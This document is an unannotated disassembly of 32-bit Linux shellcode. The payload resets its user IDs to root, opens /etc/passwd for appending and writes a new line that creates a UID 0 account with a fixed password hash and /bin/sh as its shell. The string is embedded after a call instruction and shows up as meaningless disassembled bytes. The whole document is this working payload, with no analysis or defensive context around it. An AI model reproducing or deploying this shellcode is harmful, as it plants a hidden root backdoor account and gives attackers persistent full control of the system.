00000000  31C9              xor ecx,ecx
00000002  89CB              mov ebx,ecx
00000004  6A46              push byte +0x46
00000006  58                pop eax
00000007  CD80              int 0x80
00000009  6A05              push byte +0x5
0000000B  58                pop eax
0000000C  31C9              xor ecx,ecx
0000000E  51                push ecx
0000000F  6873737764        push dword 0x64777373
00000014  682F2F7061        push dword 0x61702f2f
00000019  682F657463        push dword 0x6374652f
0000001E  89E3              mov ebx,esp
00000020  41                inc ecx
00000021  B504              mov ch,0x4
00000023  CD80              int 0x80
00000025  93                xchg eax,ebx
00000026  E822000000        call dword 0x4d
0000002B  7573              jnz 0xa0
0000002D  65723A            gs jc 0x6a
00000030  41                inc ecx
00000031  7A49              jpe 0x7c
00000033  6558              gs pop eax
00000035  7945              jns 0x7c
00000037  774D              ja 0x86
00000039  6548              gs dec eax
0000003B  58                pop eax
0000003C  363A30            cmp dh,[ss:eax]
0000003F  3A30              cmp dh,[eax]
00000041  3A3A              cmp bh,[edx]
00000043  2F                das
00000044  3A2F              cmp ch,[edi]
00000046  62696E            bound ebp,[ecx+0x6e]
00000049  2F                das
0000004A  7368              jnc 0xb4
0000004C  0A598B            or bl,[ecx-0x75]
0000004F  51                push ecx
00000050  FC                cld
00000051  6A04              push byte +0x4
00000053  58                pop eax
00000054  CD80              int 0x80
00000056  6A01              push byte +0x1
00000058  58                pop eax
00000059  CD80              int 0x80
